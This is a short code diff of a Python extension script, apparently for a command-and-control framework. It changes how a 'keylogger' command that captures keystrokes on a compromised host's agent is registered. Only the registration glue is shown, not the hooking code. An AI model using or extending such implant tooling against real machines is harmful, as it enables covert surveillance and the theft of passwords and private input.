@@ -28,5 +28,4 @@ def keylogger_start( demonID, *params ):
 
     return TaskID
 
-RegisterModule( "keylogger", "Keystroke logger using low-level keyboard hooks", "", "[agent command]", "", "" )
-RegisterCommand( keylogger_start, "keylogger", "keylogger", "Capture keystrokes for a specified duration (default 10s)", 0, "[seconds]", "15" )
+RegisterCommand( keylogger_start, "", "keylogger", "Capture keystrokes for a specified duration (default 10s)", 0, "[seconds]", "15" )
